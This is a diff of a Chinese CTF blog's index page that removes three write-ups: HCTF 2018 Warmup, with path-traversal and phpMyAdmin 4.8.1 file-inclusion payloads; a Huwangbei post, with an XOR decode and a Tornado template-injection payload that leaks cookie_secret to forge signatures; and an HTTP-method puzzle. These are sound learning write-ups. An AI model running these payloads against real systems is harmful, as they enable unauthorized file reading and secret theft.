@@ -1,1524 +1,414 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="zh-CN">
+<!DOCTYPE HTML>
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
-
-
-
-
-
-
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '6.3.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="L0ner的博客">
-<meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="L0ner的博客">
-<meta property="og:locale" content="zh-CN">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="L0ner的博客">
-
-
-
-
-
-
-  <link rel="canonical" href="http://yoursite.com/"/>
-
-
-
-<script type="text/javascript" id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>L0ner的博客</title>
-  
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style type="text/css">
-    .use-motion .motion-element,
-    .use-motion .brand,
-    .use-motion .menu-item,
-    .sidebar-inner,
-    .use-motion .post-block,
-    .use-motion .pagination,
-    .use-motion .comments,
-    .use-motion .post-header,
-    .use-motion .post-body,
-    .use-motion .collection-title { opacity: initial; }
-
-    .use-motion .logo,
-    .use-motion .site-title,
-    .use-motion .site-subtitle {
-      opacity: initial;
-      top: initial;
-    }
-
-    .use-motion {
-      .logo-line-before i { left: initial; }
-      .logo-line-after i { right: initial; }
-    }
-  </style>
-</noscript>
+    
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="L0ner&#39;s blogs">
+    <meta name="description" content="L0ner&#39;s blogs">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>L0ner&#39;s blogs</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body>
 
-  
-  
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">L0ner's blogs</span>
+                    </a>
+                </div>
+                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
     
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">L0ner的博客</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home menu-item-active">
-    <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-    <a href="/about/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-    <a href="/tags/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-    <a href="/categories/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-    <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+            <i class="fa fa-home"></i>
+            
+            <span>Index</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>Tags</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>Categories</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>Archives</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>About</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">L0ner's blogs</div>
+        <div class="logo-desc">
+            
+            Believe myself !
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                Index
+            </a>
         </li>
-      
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                Tags
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                Categories
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                Archives
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                About
+            </a>
+        </li>
+        
+        
     </ul>
-  
 
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
+    <div class="social-link"></div>
 </div>
 
-
-
-    </div>
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/11/2018hctf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="L0ner">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fx4h9ube01j30jg0jgjs3.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="L0ner的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/11/2018hctf/" itemprop="url">
-                  2018 HCTF Warmup writeup
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-11-11 22:16:12 / 修改时间：22:55:18" itemprop="dateCreated datePublished" datetime="2018-11-11T22:16:12+08:00">2018-11-11</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-symbolscount">
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">本文字数：</span>
-                
-                <span title="本文字数">528</span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">1 分钟</span>
-              
             </div>
-          
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>只有做这种签到题才能维持得了生活。<br>进入<a href="http://warmup.2018.hctf.io/" target="_blank" rel="noopener">题目</a>可看到：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4euyd67rj311s0vudj1.jpg" alt=""></p>
-<p>点进去 <strong>hint</strong> 可看到：</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fx4exuo9t2j30ug082t8w.jpg" alt=""></p>
-<p>这个url有个很明显的文件包含，推测是文件包含漏洞。然后试了一下下面两个常用的payload：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=../../../../../../ffffllllaaaagggg.php</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
-<p>。。。并没有出来什么东西。接着在看首页源代码的时候发现有个 <strong>source.php</strong> 的注释，我们进去看看：</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fx4f9ee9woj3118116wg4.jpg" alt=""></p>
-<p>又是艰难的代码审计过程。通过google发现这题是一个<a href="https://www.imuo.com/a/9d619fd76c6a0eca0904d02f06753307d46e2b1dbea245e67840082cc4b157ec" target="_blank" rel="noopener">PhpMyadmin4.81文件包含的CVE</a>，关于此漏洞的解析网上有很多，这里搬运一个：<a href="http://www.lmxspace.com/2018/06/23/phpmyadmin-4-8-1-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">《phpmyadmin-4.8.1-复现分析》</a><br>直接贴payload吧：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//warmup.2018.hctf.io/index.php?file=source.php%253f/../../../../../../ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/15/huwangbei/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="L0ner">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fx4h9ube01j30jg0jgjs3.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="L0ner的博客">
-    </span>
-
-    
-      <header class="post-header">
 
         
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/15/huwangbei/" itemprop="url">
-                  “护网杯”部分题writeup
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-10-15 16:51:27" itemprop="dateCreated datePublished" datetime="2018-10-15T16:51:27+08:00">2018-10-15</time>
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-symbolscount">
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">本文字数：</span>
-                
-                <span title="本文字数">2k</span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">2 分钟</span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h1><p>描述是“easy xor???”，提示这题需要用异或。<br>下载一个txt文件，打开后里面有一串字符：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs=</span><br></pre></td></tr></table></figure>
-<p>看到后面有“=”号，应该是base64加密。解密后得到异或密文。<br>因为flag格式的最后一个字符为“}”，猜想将密文的最后一个字符与“}”异或就可得到密钥，再用这个密钥异或所有密文就可得到flag。脚本如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str = <span class="string">"AAoHAR0nJ1YlUVQnU1BTVCVfUVZRUVUkUCBeUlVWIlBXUiNTXhs="</span></span><br><span class="line">s = base64.b64decode(str)</span><br><span class="line">print(s)</span><br><span class="line">print(hex((s[-1])^ord('&#125;')))	#0x66</span><br><span class="line">print(chr((s[-1])^ord('&#125;')))	#f</span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += chr(i^<span class="number">0x66</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
-<p>得到flag{AA0C72A5652C970773B6F8430D614E58}</p>
-<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>进去是这样的：</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6vynhepwj30ji0f83z0.jpg" alt=""><br>点开分别看到如下：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w2ukuoqj307e04ijr6.jpg" alt=""></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w36xq08j30ey04amx0.jpg" alt=""></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6w38vbymj306w03udfm.jpg" alt=""></p>
-<p>第三个flag.txt可以看到有个文件目录，此时的url为：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/file?filename=flag.txt&amp;signature=bb6d71b58a9d8c4b0e32e99eee055029</span></span><br></pre></td></tr></table></figure>
-<p>试着包含这个目录看能不能读取flag出来。构造url为：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/file?filename=/fllllllllllag&amp;signature=bb6d71b58a9d8c4b0e32e99eee055029</span></span><br></pre></td></tr></table></figure>
-<p>结果出现这个：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw6w93kycdj30qu08cq36.jpg" alt=""></p>
-<p>说签名错误，意思是得求出正确的signature来。<br>再看hint.txt给的一个提示：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret + md5(filename))</span><br></pre></td></tr></table></figure>
-<p>可能这就是求签名的式子，先求求看。式子中需要用到cookie_secret和filename，filename已经知道是“/fllllllllllag”，那么接下来就需要求cookie_secret。</p>
-<p>我们查看一下tornado这个框架的文档。<br>可以得知tornado框架里的tornado.web组件里有RequestHandler和Application类。<br>找到cookie_secret相关的东西看看。</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xcyd1prj30xq0f4my1.jpg" alt=""></p>
-<p>cookie_secret是self.application.settings的参数。</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6xk17fb3j30mu05smx2.jpg" alt=""></p>
-<p>RequestHandler.settings是self.application.settings 的别名。</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xkb0wigj312a05gt8v.jpg" alt=""></p>
-<p>接下来就是来找找如何构造url:</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw6wqcurl0j31c60ceq4a.jpg" alt=""></p>
-<p>模板可以用两个大括号来构造表达式。<br>再看看模板的一些用法:</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6wudcktlj30oo0mgjsm.jpg" alt=""></p>
-<p>handler是RequestHandler的对象。<br>于是我们可以构造表达式:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>构造url：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/error?msg=&#123;&#123;handler.settings&#125;&#125;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw6xv3jjppj31gu048mxm.jpg" alt=""></p>
-<p>就可以得到我们的cookie_secret为：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#123;k57.yLAO6?sScNFro$~l!2xX-_0n&amp;Md@j)%(GZfqYK*JDWCtv4P8mpub1#zEU^</span><br></pre></td></tr></table></figure>
-<p>现在可以把得到的cookie_secret代入式子求签名了。脚本如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">"I&#123;k57.yLAO6?sScNFro$~l!2xX-_0n&amp;Md@j)%(GZfqYK*JDWCtv4P8mpub1#zEU^"</span></span><br><span class="line">filename = <span class="string">"/fllllllllllag"</span></span><br><span class="line"></span><br><span class="line">#md5 (cookie_ secret + md5 (filename))</span><br><span class="line"></span><br><span class="line">temp = hashlib.md5(filename.encode()).hexdigest()</span><br><span class="line">sum = cookie + temp</span><br><span class="line">sign = hashlib.md5(sum.encode()).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure>
-<p>得到签名为b9a067e37b3d90410b4761bd02c95b6e，构造url：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//49.4.95.5:31849/file?filename=/fllllllllllag&amp;signature=297cf619ef0551768aac7fc0dca97838</span></span><br></pre></td></tr></table></figure>
-<p>可得到flag{0d2443ae8744ceffa67cf1513b293331} </p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/whoami/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="L0ner">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fx4h9ube01j30jg0jgjs3.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="L0ner的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/12/whoami/" itemprop="url">
-                  Hackergame 2018 我是谁writeip
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-10-12 16:48:31" itemprop="dateCreated datePublished" datetime="2018-10-12T16:48:31+08:00">2018-10-12</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-15 17:07:16" itemprop="dateModified" datetime="2018-10-15T17:07:16+08:00">2018-10-15</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-symbolscount">
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">本文字数：</span>
-                
-                <span title="本文字数">1.3k</span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">1 分钟</span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>这一题有两关<br>题目描述<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5hr20wcfj30w60ian10.jpg" alt=""><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i3urrpzj30ji0o2q4t.jpg" alt=""><br>随便点击Submit提交点东西，都是显示相同的东西。<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i4bk23yj30mc06edg8.jpg" alt=""><br>应该是提交得不对，还得找出正确的“我”出来。<br>先看看源码，里头只有一个css，并没有其他东西。又到burpsuite里抓包，并没有找出什么线索。。。接着去网上搜索关于“我是谁”的哲学问题，陷入沉思，怀疑人生。接着无意中在火狐的控制台里看到这么个东西。!<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i5mrd87j31ko0byq75.jpg" alt=""><br>I’M A TEAPOT<br>茶壶是什么鬼！！！摸不着头脑，先把TEAPOT给提交了。<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i6pg1i2j30w2098wfk.jpg" alt=""><br>得到flag{i_canN0t_BReW_c0ffEE!}和这一题第二关的链接和描述，意思是帮他泡茶。<br>点进去是这样的页面。<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw5i72cl7bj30js04qweu.jpg" alt=""><br>让我们用其他的方式来请求页面。<br>先用burpsuite抓包。<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw5i7pxjyzj30si0awq5g.jpg" alt=""><br>看到是用GET的方式来请求页面，改成POST试一试<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fw5i80s5stj30sc0co0vk.jpg" alt=""><br>出现了这么两句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The method &quot;POST&quot; is deprecated.</span><br><span class="line">See RFC-7168 for more information.</span><br></pre></td></tr></table></figure></p>
-<p>于是我们去找RFC-7168来看看，Google的时候看到维基百科对超文本咖啡壶控制协议的描述（RFC-7168是这个协议的扩展文档）。里面有点内容需要留意。<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw5i8xg5cqj31a80lg7bf.jpg" alt=""><br>可以知道BREW这个HTTP请求能泡茶，先抓包修改请求试试。<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw5ia64twuj30sg0caq5r.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please check if there is anything missing in your header.</span><br></pre></td></tr></table></figure></p>
-<p>提示我们请求头部少了点东西。看看RFC-7168文档先。文档很长，但大概内容是教我们怎么“泡茶”。在The “message/teapot” Media Type这一段中我们可以看到这一句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Content-Type header of a POST or BREW request sent to a TEA-capable pot MUST be &quot;message/teapot&quot; if tea is to be requested.</span><br></pre></td></tr></table></figure></p>
-<p>意思是如果要请求茶，则要发送的BREW或POST请求的Content-Type头必须是“message / teapot”<br>于是我们在包里添上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: message/teapot</span><br></pre></td></tr></table></figure></p>
